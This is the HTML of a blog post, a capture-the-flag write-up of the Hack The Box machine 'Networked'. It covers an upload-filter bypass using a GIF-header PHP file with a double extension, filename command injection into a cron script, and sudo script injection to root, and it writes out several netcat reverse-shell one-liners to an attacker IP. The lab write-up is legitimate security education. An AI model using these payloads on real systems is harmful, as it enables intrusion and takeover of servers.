/etc/sysconfig/network-scripts/network-functions. How was the function imported? This is where I also learnt that . &lt;command&gt; is actually the same as source &lt;command&gt;, which reads and execute commands in the &lt;command&gt; file, essentially importing the functions in there too. 1 2 3 4 5 6 7 source_config () { CONFIG=${CONFIG##*/} ... . /etc/sysconfig/network-scripts/$CONFIG ... } In source_config, the corresponding config file (ifcfg-guly) in /etc/sysconfig/network-scripts is imported, which calls all the variable assignments lines and this is where commands can be injected into. When VAR=VALUE is executed, you are assigning VALUE to VAR to the shell. However, when VAR=VALUE &lt;command&gt; is executed, VALUE is assigned to VAR only in the environment context of the &lt;command&gt; and the &lt;command&gt; is executed! So when we injected our command, it will be saved as NAME=a /tmp/runme, which result in /tmp/runme being ran!" /><link rel="canonical" href="https://rizemon.github.io/posts/networked-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/networked-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-11-17T11:28:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Networked" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/networked-htb/"},"description":"I really learnt a lot from this box such as the double extension attack and passing of variables into the environment of a command in bash. The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ echo &quot;10.10.10.146 networked.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ nmap -sV -sT -sC networked.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-31 11:49 EDT Nmap scan report for networked.htb (10.10.10.146) Host is up (0.27s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: |_ 2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). 443/tcp closed https Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 144.41 seconds Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, lets see if we can gather any information or exploit it ? Enumeration (1) index.php: 1 2 3 Hello mate, we&#39;re building the new FaceMash! Help by funding us and be the new Tyler&amp;Cameron! Join us at the pool party this Sat to get a glimpse Doesn’t seem like much but if we inspect the source: 1 2 3 4 5 6 7 8 &lt;html&gt; &lt;body&gt; Hello mate, we&#39;re building the new FaceMash!&lt;/br&gt; Help by funding us and be the new Tyler&amp;Cameron!&lt;/br&gt; Join us at the pool party this Sat to get a glimpse &lt;!-- upload and gallery not yet linked --&gt; &lt;/body&gt; &lt;/html&gt; Hm… upload and gallery? Unfortunately, appending them to the URL gives us a 404. Looks like we have to brute force the directory and files. I will be using gobuster: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ gobuster dir -u http://networked.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://networked.htb [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/08/31 21:54:19 Starting gobuster =============================================================== /uploads (Status: 301) /backup (Status: 301) =============================================================== 2019/08/31 21:59:28 Finished =============================================================== On /backup we get a directory listing which only contains backup.tar. After downloading backup.tar, we extract all of its contents. 1 2 3 4 5 $ tar -xvf backup.tar index.php lib.php photos.php upload.php Seems like the contents of web server? Maybe this is a backup of the current web server? upload.php: photos.php: Lets try to upload an image into the web server! We clicked on Browse, selected our picture and hit go!. Done! If we visit photos.php again, We see a new picture which has a name containing our IP address but with the periods replaced with underscores. Another thing to note is that the extensions were maintained as well. Since we can upload files onto the server, lets try to upload a .php file which will establish a reverse connection by to our listener! 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... reverseconn.php: 1 2 3 &lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.XXX.XXX 1337 &gt;/tmp/f&#39;); ?&gt; Looks like our file got rejected :( Since we already have the source code for upload.php, lets check it out. The first to look at is this: 1 2 3 4 5 6 7 $myFile = $_FILES[&quot;myFile&quot;]; if (!(check_file_type($_FILES[&quot;myFile&quot;]) &amp;&amp; filesize($_FILES[&#39;myFile&#39;][&#39;tmp_name&#39;]) &lt; 60000)) { echo &#39;&lt;pre&gt;Invalid image file.&lt;/pre&gt;&#39;; displayform(); } Since we know our file doesnt exceed 60Mb, we can focus on check_file_type. This function is located in lib.php. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 function check_file_type($file) { $mime_type = file_mime_type($file); if (strpos($mime_type, &#39;image/&#39;) === 0) { return true; } else { return false; } } function file_mime_type($file) { $regexp = &#39;/^([a-z\\-]+\\/[a-z0-9\\-\\.\\+]+)(;\\s.+)?$/&#39;; if (function_exists(&#39;finfo_file&#39;)) { $finfo = finfo_open(FILEINFO_MIME); if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system { $mime = @finfo_file($finfo, $file[&#39;tmp_name&#39;]); finfo_close($finfo); if (is_string($mime) &amp;&amp; preg_match($regexp, $mime, $matches)) { $file_type = $matches[1]; return $file_type; } } } if (function_exists(&#39;mime_content_type&#39;)) { $file_type = @mime_content_type($file[&#39;tmp_name&#39;]); if (strlen($file_type) &gt; 0) // It&#39;s possible that mime_content_type() returns FALSE or an empty string { return $file_type; } } return $file[&#39;type&#39;]; } Judging from the code, it seems like it is checking the MIME Content-type of the file. Examples of MIME Content-types include image/jpeg, text/html, application/json. This is done by checking the file header bytes and using a MIME database file to determine the Content-Type. Looks like the Content-Type needs to contain image/, such as image/png, image/jpeg and image/gif. With this knowledge, we know that we need to trick the web server into thinking our file is an image. This can actually be done by prepending GIF89a to reverseconn.php! 1 2 3 4 GIF89a &lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.XXX.XXX 1337 &gt;/tmp/f&#39;); ?&gt; To find out if it works, we use the file command, which uses the same way to determine the file type. 1 2 $ file reverseconn.php reverseconn.php: GIF image data 16188 x 26736 Isn’t that magical? XD Next up, we have another section that checks the extension of the file against a list of image extensions. 1 2 3 4 5 6 7 8 list ($foo,$ext) = getnameUpload($myFile[&quot;name&quot;]); $validext = array(&#39;.jpg&#39;, &#39;.png&#39;, &#39;.gif&#39;, &#39;.jpeg&#39;); $valid = false; foreach ($validext as $vext) { if (substr_compare($myFile[&quot;name&quot;], $vext, -strlen($vext)) === 0) { $valid = true; } } If we renamed our file from reverseconn.php to reverseconn.jpeg and try to upload it, the file will be uploaded successfully. However, the file will be treated as an image by the web server. The function that returns the extension of the file is getnameUpload, which is located in lib.php. 1 2 3 4 5 6 7 function getnameUpload($filename) { $pieces = explode(&#39;.&#39;,$filename); $name= array_shift($pieces); $name = str_replace(&#39;_&#39;,&#39;.&#39;,$name); $ext = implode(&#39;.&#39;,$pieces); return array($name,$ext); } After reading the code, we understand that the extension taken from the second period onwards. So if our file name is reverseconn.php.jpeg, the extension will be returned will be .php.jpeg. Lets rename our file to reverseconn.php.jpeg to see what happens. 1 2 3 4 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.146] 36758 sh: no job control in this shell sh-4.2$ whoami apache Alright it worked! But why? Shouldn’t the file still be treated as .jpeg file since it ends with it? Since we already have a shell as apache, lets check out the config for the apache service. /etc/httpd/conf.d/php.conf: 1 AddHandler php5-script .php According to apache’s documentation, if more than one extension is given that maps onto the same type of metadata, then the one to the right will be used, which would mean that .jpeg will be used in this case. However, due to the line in php.conf, any file with the name containing .php will be treated as a PHP script by the web server. Continuing on, lets see what other users are available on the machine. 1 2 3 sh-4.2$ ls /home ls /home guly However when we try to read user.txt, 1 2 3 sh-4.2$ cat /home/guly/user.txt cat /home/guly/user.txt cat: /home/guly/user.txt: Permission denied Looks like we need to log in as user guly. If we check the home directory of guly, 1 2 3 4 5 sh-4.2$ ls /home/guly ls check_attack.php crontab.guly user.txt Checking crontab.guly, 1 */3 * * * * php /home/guly/check_attack.php It contains a crontab entry which runs the check_attack.php script every 3 minutes. Checking check_attack.php, 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 &lt;?php require &#39;/var/www/html/lib.php&#39;; $path = &#39;/var/www/html/uploads/&#39;; $logpath = &#39;/tmp/attack.log&#39;; $to = &#39;guly&#39;; $msg= &#39;&#39;; $headers = &quot;X-Mailer: check_attack.php\\r\\n&quot;; $files = array(); $files = preg_grep(&#39;/^([^.])/&#39;, scandir($path)); foreach ($files as $key =&gt; $value) { $msg=&#39;&#39;; if ($value == &#39;index.html&#39;) { continue; } #echo &quot;-------------\\n&quot;; #print &quot;check: $value\\n&quot;; list ($name,$ext) = getnameCheck($value); $check = check_ip($name,$value); if (!($check[0])) { echo &quot;attack!\\n&quot;; # todo: attach file file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX); exec(&quot;rm -f $logpath&quot;); exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;); echo &quot;rm -f $path$value\\n&quot;; mail($to, $msg, $msg, $headers, &quot;-F$value&quot;); } } ?&gt; It scans for all files in the /var/www/html/uploads folder, extract the file names without the extensions and check each one of them if they match the naming format that upload.php uses, which means that it has to look like 10_10_XXX_XXX.png or 127_0_0_1.png. And if they don’t, it will be logged as an attack attempt and certain commands will be executed. The best part? Looks like we can inject some commands using the $value variable, which is the filename of the file. Lets create another listener 1 2 $ nc -lvnp 1338 listening on [any] 1338 ... and create a file in /var/www/html/uploads/ with a very specially crafted name. 1 sh-4.2$ touch &quot;/var/www/html/uploads/; nc -c bash 10.10.XXX.XXX 1338;&quot; With this file name, it will definitely be logged as an attack attempt and trigger the command to be executed. user.txt After a while (due to the check_attack.php running every 3 minutes), we get a shell. 1 2 3 4 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.146] 39656 python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; [guly@networked ~]$ cat user.txt 526cXXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) To quickly enumerate for possible privilege escalation vectors, I will using LinEnum. To transfer it from my machine to this machine, I will be using python’s SimpleHTTPServer module. On my machine: 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/Downloads/LinEnum.sh . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... On the Networked machine: 1 2 3 4 5 6 [guly@networked ~]$ cd /tmp [guly@networked /tmp]$ curl http://10.10.XXX.XXX/LinEnum.sh &gt; LinEnum.sh curl 10.10.XX.XX/LinEnum.sh &gt; LinEnum.sh % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 45651 100 45651 0 0 41674 0 0:00:01 0:00:01 --:--:-- 41690 When I ran it, I saw something interesting! 1 2 3 4 5 6 7 8 9 [guly@networked /tmp]$ chmod 777 LinEnum.sh [guly@networked /tmp]$ ./LinEnum.sh ... User guly may run the following commands on networked: (root) NOPASSWD: /usr/local/sbin/changename.sh [+] Possible sudo pwnage! /usr/local/sbin/changename.sh That was easy. This means that we can just sudo /usr/local/sbin/changename.sh and be on our jolly way. But here comes the tough part. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #!/bin/bash -p cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoF DEVICE=guly0 ONBOOT=no NM_CONTROLLED=no EoF regexp=&quot;^[a-zA-Z0-9_\\ /-]+$&quot; for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do echo &quot;interface $var:&quot; read x while [[ ! $x =~ $regexp ]]; do echo &quot;wrong input, try again&quot; echo &quot;interface $var:&quot; read x done echo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly done /sbin/ifup guly0 Before we start analysing, lets run it first. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 [guly@networked /tmp]$ sudo /usr/local/sbin/changename.sh sudo /usr/local/sbin/changename.sh interface NAME: test test interface PROXY_METHOD: test test interface BROWSER_ONLY: test test interface BOOTPROTO: test test ERROR : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization. Looks like something went wrong? According to changename.sh, it was reading values for different fields like NAME, PROXY_METHOD etc and writing them into /etc/sysconfig/network-scripts/ifcfg-guly in the given format FIELD=VALUE. /etc/sysconfig/network-scripts/ifcfg-guly: 1 2 3 4 5 6 7 DEVICE=guly0 ONBOOT=no NM_CONTROLLED=no NAME=test PROXY_METHOD=test BROWSER_ONLY=test BOOTPROTO=test I wasn’t sure how we can inject commands using this script but as I was fuzzing with different values, I saw a new error. 1 2 3 4 5 6 7 8 9 [guly@networked ~]$ sudo /usr/local/sbin/changename.sh sudo /usr/local/sbin/changename.sh interface NAME: a a a a ... /etc/sysconfig/network-scripts/ifcfg-guly: line 4: a: command not found ... ERROR : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization. Our input is being executed ? Lets try to rerun it but insert a command instead. 1 2 3 4 5 6 7 8 [guly@networked ~]$ sudo /usr/local/sbin/changename.sh sudo /usr/local/sbin/changename.sh interface NAME: a whoami ... root ... ERROR : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization. Nice! Now we know where to inject our commands, we proceed to establish our reverse shell connection. However, since our input cannot contain periods (.), we can create a script that contains our reverse shell commands and execute it instead. On my machine, we start another listener. 1 2 $ nc -lvnp 1339 listening on [any] 1339 ... Then, on the Networked machine, 1 2 3 4 5 6 7 8 [guly@networked /tmp]$ echo &quot;rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2&gt;&amp;1|nc 10.10.XXX.XXX 1339 &gt;/tmp/g&quot; &gt; runme [guly@networked /tmp]$ chmod 777 runme [guly@networked /tmp]$ sudo /usr/local/sbin/changename.sh sudo /usr/local/sbin/changename.sh interface NAME: a /tmp/runme ... ERROR : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization. root.txt Back on our machine, we caught the reverse shell connection. 1 2 3 4 5 6 7 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.146] 51618 sh: no job control in this shell sh-4.2# whoami whoami root sh-4.2# cat /root/root.txt 0a8eXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles ! Extras I went on to study how was /etc/sysconfig/network-scripts/ifcfg-guly was being used when /sbin/ifup guly0 was executed and it actually explains why commands can be injected. /sbin/ifup guly0 1 2 3 4 5 6 7 8 9 #!/bin/bash ... cd /etc/sysconfig/network-scripts . ./network-functions ... CONFIG=${1} ... source_config ... There was one line which was calling source_config, which is a function imported from /etc/sysconfig/network-scripts/network-functions. How was the function imported? This is where I also learnt that . &lt;command&gt; is actually the same as source &lt;command&gt;, which reads and execute commands in the &lt;command&gt; file, essentially importing the functions in there too. 1 2 3 4 5 6 7 source_config () { CONFIG=${CONFIG##*/} ... . /etc/sysconfig/network-scripts/$CONFIG ... } In source_config, the corresponding config file (ifcfg-guly) in /etc/sysconfig/network-scripts is imported, which calls all the variable assignments lines and this is where commands can be injected into. When VAR=VALUE is executed, you are assigning VALUE to VAR to the shell. However, when VAR=VALUE &lt;command&gt; is executed, VALUE is assigned to VAR only in the environment context of the &lt;command&gt; and the &lt;command&gt; is executed! So when we injected our command, it will be saved as NAME=a /tmp/runme, which result in /tmp/runme being ran!","url":"https://rizemon.github.io/posts/networked-htb/","@type":"BlogPosting","headline":"Hack The Box - Networked","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2019-11-17T11:28:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Networked | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Networked</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Networked</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Nov 17, 2019, 11:28 AM +0800" > Nov 17, 2019 <i class="unloaded">2019-11-17T11:28:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2475 words">13 min</span></div></div><div class="post-content"><p>I really learnt a lot from this box such as the double extension attack and passing of variables into the environment of a command in bash.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/networked.png" alt="" height="414px" width="615px" /></p><p>The operating system that I will be using to tackle this machine is a Kali Linux VM.</p><p>Always remember to map a domain name to the machine’s IP address to ease your rooting !</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.146 networked.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> networked.htb
Starting Nmap 7.70 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-08-31 11:49 EDT
Nmap scan report <span class="k">for </span>networked.htb <span class="o">(</span>10.10.10.146<span class="o">)</span>
Host is up <span class="o">(</span>0.27s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|_  2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b <span class="o">(</span>RSA<span class="o">)</span>
80/tcp  open   http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
|_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.41 seconds
</span></pre></table></code></div></div><p>Not much can be done with the <code class="language-plaintext highlighter-rouge">ssh</code> service as we do not have any credentials on hand so lets come back to it later. As for the <code class="language-plaintext highlighter-rouge">http</code> service, lets see if we can gather any information or exploit it ?</p><h1 id="enumeration-1">Enumeration (1)</h1><p><code class="language-plaintext highlighter-rouge">index.php</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Hello mate, we're building the new FaceMash!
Help by funding us and be the new Tyler&amp;Cameron!
Join us at the pool party this Sat to get a glimpse
</pre></table></code></div></div><p>Doesn’t seem like much but if we inspect the source:</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;body&gt;</span>
Hello mate, we're building the new FaceMash!<span class="nt">&lt;/br&gt;</span>
Help by funding us and be the new Tyler<span class="err">&amp;</span>Cameron!<span class="nt">&lt;/br&gt;</span>
Join us at the pool party this Sat to get a glimpse
<span class="c">&lt;!-- upload and gallery not yet linked --&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
